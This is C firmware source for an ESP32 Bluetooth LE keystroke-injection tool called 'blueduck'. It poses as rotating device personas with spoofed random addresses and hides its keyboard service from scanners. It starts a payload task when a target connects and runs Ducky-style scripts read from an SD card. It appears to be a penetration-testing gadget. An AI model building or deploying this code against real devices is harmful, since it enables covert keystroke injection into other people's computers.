#define BD_ADV_INSTANCE 0

static void bd_ext_adv_start(int persona_idx)
{
    ESP_LOGI(TAG, "bd_ext_adv_start: persona=%d ('%s') synced=%d",
             persona_idx, s_personas[persona_idx].name, ble_hs_synced());

    ble_gap_ext_adv_stop(BD_ADV_INSTANCE);

    ble_svc_gap_device_name_set(s_personas[persona_idx].name);
    ble_svc_gap_device_appearance_set(s_personas[persona_idx].appearance);

    struct ble_gap_ext_adv_params p;
    memset(&p, 0, sizeof(p));
    p.connectable   = 1;
    p.scannable     = 1;
    p.legacy_pdu    = 1;
    p.own_addr_type = BLE_OWN_ADDR_RANDOM;
    p.primary_phy   = BLE_HCI_LE_PHY_1M;
    p.secondary_phy = BLE_HCI_LE_PHY_1M;
    p.itvl_min      = BLE_GAP_ADV_ITVL_MS(200);
    p.itvl_max      = BLE_GAP_ADV_ITVL_MS(350);
    p.sid           = BD_ADV_INSTANCE;

    int rc = ble_gap_ext_adv_configure(BD_ADV_INSTANCE, &p, NULL, bd_gap_cb, NULL);
    if (rc != 0) { ESP_LOGE(TAG, "ext_adv_configure: rc=%d", rc); return; }

    ble_addr_t rnd = { .type = BLE_ADDR_RANDOM };
    memcpy(rnd.val, s_persona_addr[persona_idx], 6);
    rc = ble_gap_ext_adv_set_addr(BD_ADV_INSTANCE, &rnd);
    if (rc != 0) { ESP_LOGE(TAG, "ext_adv_set_addr: rc=%d", rc); return; }

    /* Advertise name + appearance only — NO HID UUID in adv payload.
     * Omitting UUID 0x1812 prevents passive scanners from showing a generic HID icon;
     * the HID service is still fully discoverable after connection via GATT. */
    struct ble_hs_adv_fields f;
    memset(&f, 0, sizeof(f));
    f.flags                 = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    f.name                  = (const uint8_t *)s_personas[persona_idx].name;
    f.name_len              = (uint8_t)strlen(s_personas[persona_idx].name);
    f.name_is_complete      = 1;
    f.appearance            = s_personas[persona_idx].appearance;
    f.appearance_is_present = 1;

    struct os_mbuf *om = os_msys_get_pkthdr(BLE_HS_ADV_MAX_SZ, 0);
    if (!om) { ESP_LOGE(TAG, "ext_adv: no mbuf"); return; }

    rc = ble_hs_adv_set_fields_mbuf(&f, om);
    if (rc != 0) { os_mbuf_free_chain(om); ESP_LOGE(TAG, "set_fields: rc=%d", rc); return; }

    rc = ble_gap_ext_adv_set_data(BD_ADV_INSTANCE, om);
    if (rc != 0) { ESP_LOGE(TAG, "set_data: rc=%d", rc); return; }

    rc = ble_gap_ext_adv_start(BD_ADV_INSTANCE, 0, 0);
    if (rc == 0 || rc == BLE_HS_EALREADY) {
        const uint8_t *a = s_persona_addr[persona_idx];
        ESP_LOGI(TAG, "Advertising as '%s'  %02X:%02X:%02X:%02X:%02X:%02X",
                 s_personas[persona_idx].name, a[5], a[4], a[3], a[2], a[1], a[0]);
    } else {
        ESP_LOGE(TAG, "ext_adv_start: rc=%d", rc);
    }
}

// ── GAP callback ──────────────────────────────────────────────────────────────

static int bd_gap_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    char addr[18] = "";
    struct ble_gap_conn_desc desc;

    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            s_conn_handle = event->connect.conn_handle;
            s_paired      = false;
            s_connects++;
            if (ble_gap_conn_find(s_conn_handle, &desc) == 0)
                bd_addr_str(desc.peer_ota_addr.val, addr);
            bd_log("connect", addr, NULL);
            ESP_LOGI(TAG, "Connected: %s", addr);
            if (s_payload_stack) {
                xTaskCreateStatic(bd_payload_task, "bd_payload", BD_PAYLOAD_STACK_WORDS,
                                  NULL, 5, s_payload_stack, &s_payload_tcb);
            } else {
                ESP_LOGE(TAG, "bd_payload_task skipped — no PSRAM stack");
            }
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        s_disconnects++;
        s_paired = false;
        bd_addr_str(event->disconnect.conn.peer_ota_addr.val, addr);
        {
            char kv[32];
            snprintf(kv, sizeof(kv), "\"reason\":%d,\"leds\":%d",
                     event->disconnect.reason, s_led_state);
            bd_log("disconnect", addr, kv);
        }
        ESP_LOGI(TAG, "Disconnected: %s reason=%d", addr, event->disconnect.reason);
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        s_led_state   = 0;
        if (s_active) bd_ext_adv_start(s_persona);
        break;

    case BLE_GAP_EVENT_ENC_CHANGE:
        if (event->enc_change.status == 0) {
            s_paired = true;
            ESP_LOGI(TAG, "Paired (enc ok) — script will fire in 3 s");
        }
        if (ble_gap_conn_find(event->enc_change.conn_handle, &desc) == 0)
            bd_addr_str(desc.peer_ota_addr.val, addr);
        {
            char kv[32];
            snprintf(kv, sizeof(kv), "\"enc_status\":%d", event->enc_change.status);
            bd_log("pair", addr, kv);
        }
        ESP_LOGI(TAG, "Paired: %s status=%d", addr, event->enc_change.status);
        break;

    default:
        break;
    }
    return 0;
}

// ── Public API ────────────────────────────────────────────────────────────────

void blueduck_register_services(void)
{
    s_hid_report_handle = 0;   /* clear before NimBLE writes the assigned handle */
    ble_gatts_count_cfg(s_bd_svcs);
    ble_gatts_add_svcs(s_bd_svcs);
}

void blueduck_init(SemaphoreHandle_t sd_mutex, bd_gps_fn_t gps_fn)
{
    s_sd_mutex = sd_mutex;
    s_gps_fn   = gps_fn;
    bd_gen_persona_addrs();
    if (!s_payload_stack) {
        s_payload_stack = heap_caps_malloc(BD_PAYLOAD_STACK_WORDS * sizeof(StackType_t),
                                           MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (!s_payload_stack)
            ESP_LOGW(TAG, "PSRAM stack alloc failed — payload task may not run after BLE");
    }
    if (!s_rot_timer) {
        esp_timer_create_args_t args = { .callback = bd_rot_timer_cb, .name = "bd_rot" };
        esp_timer_create(&args, &s_rot_timer);
    }
}

void blueduck_start(int persona_idx, const char *script_path)
{
    bool do_rotate = (persona_idx == BD_AUTO_ROTATE_IDX);
    esp_timer_stop(s_rot_timer);

    if (do_rotate)
        persona_idx = (s_auto_rotate && s_persona < BD_PERSONA_COUNT) ? s_persona : 0;
    else if (persona_idx < 0 || persona_idx >= BD_PERSONA_COUNT)
        persona_idx = 0;

    s_auto_rotate = do_rotate;
    s_persona     = persona_idx;
    s_active      = true;

    strncpy(s_script_path, script_path ? script_path : "", sizeof(s_script_path) - 1);

    /* Create per-session log file */
    if (!s_log_path[0]) {
        const char *dir = "/sdcard/lab/ble/blueduck";
        if (s_sd_mutex && xSemaphoreTake(s_sd_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
            mkdir("/sdcard/lab", 0755);
            mkdir("/sdcard/lab/ble", 0755);
            mkdir(dir, 0755);
            mkdir(BD_SCRIPT_DIR, 0755);
            xSemaphoreGive(s_sd_mutex);
        }
        const gps_data_t *gps = s_gps_fn ? s_gps_fn() : NULL;
        char suffix[24];
        if (gps && gps->time_utc[0]) {
            snprintf(suffix, sizeof(suffix), "%s", gps->time_utc);
            for (int i = 0; suffix[i]; i++) if (suffix[i] == ':') suffix[i] = '-';
        } else {
            snprintf(suffix, sizeof(suffix), "%lu",
                     (unsigned long)(xTaskGetTickCount() / configTICK_RATE_HZ));
        }
        snprintf(s_log_path, sizeof(s_log_path), "%s/blueduck_%s.jsonl", dir, suffix);
        bd_log("start", NULL, NULL);
    }

    bd_ext_adv_start(persona_idx);
    if (s_auto_rotate) esp_timer_start_periodic(s_rot_timer, BD_ROTATE_PERIOD_US);
}

void blueduck_stop(void)
{
    s_active      = false;
    s_auto_rotate = false;
    s_executing   = false;
    esp_timer_stop(s_rot_timer);
    ble_gap_ext_adv_stop(BD_ADV_INSTANCE);
    if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
        ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    }
    bd_log("stop", NULL, NULL);
    s_log_path[0] = '\0';
}

bool blueduck_is_active(void) { return s_active; }

void blueduck_get_stats(blueduck_stats_t *out)
{
    out->connects        = s_connects;
    out->payloads_sent   = s_payloads;
    out->disconnects     = s_disconnects;
    out->current_persona = s_auto_rotate ? BD_AUTO_ROTATE_IDX : s_persona;
    out->active          = s_active;
    out->executing       = s_executing;
    int pidx = s_persona < BD_PERSONA_COUNT ? s_persona : 0;
    strlcpy(out->persona_name, s_personas[pidx].name, sizeof(out->persona_name));
    strlcpy(out->script_path, s_script_path, sizeof(out->script_path));
    strlcpy(out->log_path, s_log_path, sizeof(out->log_path));
}

int         blueduck_persona_count(void) { return BD_PERSONA_COUNT + 1; }
const char *blueduck_persona_name(int idx)
{
    if (idx == BD_AUTO_ROTATE_IDX) return "Auto Rotate (5 min)";
    if (idx < 0 || idx >= BD_PERSONA_COUNT) return "";
    return s_personas[idx].name;
}

int blueduck_scan_scripts(void)
{
    /* Free any previously cached script content */
    for (int i = 0; i < BD_MAX_SCRIPTS; i++) {
        if (s_script_cache[i]) {
            heap_caps_free(s_script_cache[i]);
            s_script_cache[i]   = NULL;
            s_script_cache_len[i] = 0;
        }
    }
    s_script_count = 0;
    if (!s_sd_mutex) return 0;

    if (xSemaphoreTake(s_sd_mutex, pdMS_TO_TICKS(500)) != pdTRUE) return 0;

    mkdir("/sdcard/lab", 0755);
    mkdir("/sdcard/lab/ble", 0755);
    mkdir("/sdcard/lab/ble/blueduck", 0755);
    mkdir(BD_SCRIPT_DIR, 0755);

    DIR *d = opendir(BD_SCRIPT_DIR);
    if (d) {
        struct dirent *ent;
        while ((ent = readdir(d)) && s_script_count < BD_MAX_SCRIPTS) {
            const char *name = ent->d_name;
            size_t len = strlen(name);
            if (len > 5 && strcasecmp(name + len - 5, ".duck") == 0) {
                snprintf(s_script_names[s_script_count], sizeof(s_script_names[0]),
                         "%.*s", (int)(len - 5), name);
                snprintf(s_script_paths[s_script_count], sizeof(s_script_paths[0]),
                         "%.50s/%.60s", BD_SCRIPT_DIR, name);

                /* Read script content into PSRAM now, while WiFi DMA RAM is
                   still available.  BLE leaves < 1 KB DMA-capable free, which
                   causes sdmmc_read_blocks to fail with allocate_dma_buf 0x101
                   at execution time. */
                struct stat st;
                if (stat(s_script_paths[s_script_count], &st) == 0 && st.st_size > 0) {
                    char *buf = heap_caps_malloc((size_t)st.st_size + 1,
                                                 MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
                    if (buf) {
                        FILE *sf = fopen(s_script_paths[s_script_count], "r");
                        if (sf) {
                            size_t n = fread(buf, 1, (size_t)st.st_size, sf);
                            fclose(sf);
                            buf[n] = '\0';
                            s_script_cache[s_script_count]   = buf;
                            s_script_cache_len[s_script_count] = n;
                            ESP_LOGI(TAG, "Cached '%s' (%u B) in PSRAM",
                                     s_script_names[s_script_count], (unsigned)n);
                        } else {
                            heap_caps_free(buf);
                        }
                    } else {
                        ESP_LOGW(TAG, "PSRAM alloc failed for script cache '%s'",
                                 s_script_names[s_script_count]);
                    }
                }

                s_script_count++;
            }
        }
        closedir(d);
    }
    xSemaphoreGive(s_sd_mutex);
    ESP_LOGI(TAG, "Found %d script(s) in %s", s_script_count, BD_SCRIPT_DIR);
    return s_script_count;
}

const char *blueduck_script_name(int idx)
{
    if (idx < 0 || idx >= s_script_count) return "";
    return s_script_names[idx];
}

const char *blueduck_script_path(int idx)
{
    if (idx < 0 || idx >= s_script_count) return "";
    return s_script_paths[idx];
}
